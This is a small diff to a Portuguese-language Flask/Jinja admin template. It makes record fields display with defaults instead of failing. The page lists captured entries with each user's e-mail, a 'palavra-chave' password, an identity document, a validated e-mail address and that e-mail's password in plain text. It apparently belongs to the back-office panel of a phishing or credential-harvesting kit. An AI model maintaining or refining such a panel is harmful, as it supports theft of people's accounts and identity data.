@@ -1,3 +1,4 @@
+<!-- templates/admin.html -->
 <!DOCTYPE html>
 <html lang="pt">
 <head>
@@ -82,14 +83,14 @@
     <div class="contador">🔢 Total de registros: {{ dados|length }}</div>
     {% for registro in dados %}
       <div class="registro">
-        <div class="registro-title">🗂️ Registro nº{{ loop.index }} — {{ registro['datahora'] }}</div>
+        <div class="registro-title">🗂️ Registro nº{{ loop.index }} — {{ registro.get('datahora', '—') }}</div>
 
-        <div class="campo">🧑‍💼 Usuário/E-mail: {{ registro['usuario'] }}</div>
-        <div class="campo">🔑 Palavra-Chave: {{ registro['palavrachave'] }}</div>
-        <div class="campo">📄 Documento: {{ registro['documento'] }}</div>
+        <div class="campo">🧑‍💼 Usuário/E-mail: {{ registro.get('usuario', '—') }}</div>
+        <div class="campo">🔑 Palavra-Chave: {{ registro.get('palavrachave', '—') }}</div>
+        <div class="campo">📄 Documento: {{ registro.get('documento', '—') }}</div>
         <br>
-        <div class="campo">📥 E-mail Validado: {{ registro['email'] }}</div>
-        <div class="campo">🔐 Senha do E-mail: {{ registro['senha_email'] }}</div>
+        <div class="campo">📥 E-mail Validado: {{ registro.get('email', '—') }}</div>
+        <div class="campo">🔐 Senha do E-mail: {{ registro.get('senha_email', '—') }}</div>
 
         <div class="excluir">
           <form method="POST" action="/excluir/{{ registro['_id'] }}">
